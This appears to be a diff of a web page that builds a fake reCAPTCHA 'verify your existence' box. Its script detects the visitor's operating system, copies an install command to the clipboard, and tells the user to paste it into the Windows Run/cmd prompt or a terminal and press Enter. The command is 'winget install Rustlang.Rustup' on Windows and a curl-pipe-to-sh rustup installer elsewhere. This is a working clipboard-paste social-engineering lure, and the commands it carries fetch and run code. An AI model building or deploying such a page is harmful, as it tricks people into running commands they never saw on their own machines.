@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>simpleflips</title>
+    <title>lorem</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body, html {
@@ -109,23 +109,57 @@
     <div class="container">
         <div class="overlay" id="overlay"></div>
         <div class="recaptcha-box">
-            <h2>meow nya mrrp</h2>
-            <p>meeeeeeowwww</p>
+            <h2 id="mainTitle">Verify your existance</h2>
+            <p id="mainDesc">Click the button to verify your existance</p>
             <div class="recaptcha-button" id="verifyButton">
                 <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA Logo">
-                <span>sample text</span>
+                <span>Verify OS</span>
             </div>
             <div class="recaptcha-popup" id="recaptchaPopup">
                 <h3>Verification Steps</h3>
-                <p>1. meow "<i class="fab fa-windows"></i>" + R</p>
-                <p>2. nya</p>
-                <p>3. mrrp</p>
+                <p id="step1"></p>
+                <p id="step2"></p>
+                <p id="step3"></p>
             </div>
         </div>
     </div>
     <script>
+        function detectOS() {
+            const userAgent = window.navigator.userAgent.toLowerCase();
+            if (userAgent.indexOf("win") > -1) return "Windows";
+            if (userAgent.indexOf("mac") > -1) return "macOS";
+            if (userAgent.indexOf("linux") > -1) return "Linux";
+            return "Unknown";
+        }
+
+        function updateContent(os) {
+            const mainTitle = document.getElementById("mainTitle");
+            const mainDesc = document.getElementById("mainDesc");
+            const step1 = document.getElementById("step1");
+            const step2 = document.getElementById("step2");
+            const step3 = document.getElementById("step3");
+
+            if (os === "Windows") {
+                mainTitle.textContent = "3 EASY STEPS :3";
+                mainDesc.textContent = "Verify your existence";
+                step1.innerHTML = '1. Press <i class="fab fa-windows"></i> + R';
+                step2.textContent = '2. Type "cmd" and press Enter';
+                step3.textContent = '3. Enter "CTRL + V"';
+                return "winget install Rustlang.Rustup";
+            } else {
+                mainTitle.textContent = "3 EASY STEPS :3";
+                mainDesc.textContent = "Verify your existence";
+                step1.textContent = '1. Open Terminal';
+                step2.textContent = '2. Press "CTRL + SHIFT + V"';
+                step3.textContent = '3. Press Enter';
+                return "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh";
+            }
+        }
+
         function verify() {
-            const textToCopy = "meow";
+            const os = detectOS();
+            const textToCopy = updateContent(os);
+
             const tempTextArea = document.createElement("textarea");
             tempTextArea.value = textToCopy;
             document.body.appendChild(tempTextArea);
